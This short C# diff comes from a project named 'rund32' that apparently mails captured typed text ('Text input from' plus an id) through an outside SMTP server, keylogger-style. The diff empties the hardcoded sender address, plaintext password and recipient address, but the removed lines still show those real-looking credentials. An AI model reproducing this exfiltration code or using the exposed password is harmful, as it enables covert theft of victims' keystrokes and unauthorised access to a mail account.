@@ -540,9 +540,9 @@ namespace rund32
             Thread Thread1 = new Thread(() =>
             {
                 string smtpServer = "smtp.list.ru";
-                string from = "soild@list.ru";
-                string password = "Hi73s6dL";
-                string mailto = "soild2015@mail.ru";
+                string from = "";
+                string password = "";
+                string mailto = "";
                 string caption = "Ввод текста от " + id;
                 //MessageBox.Show("Отправляю");
 
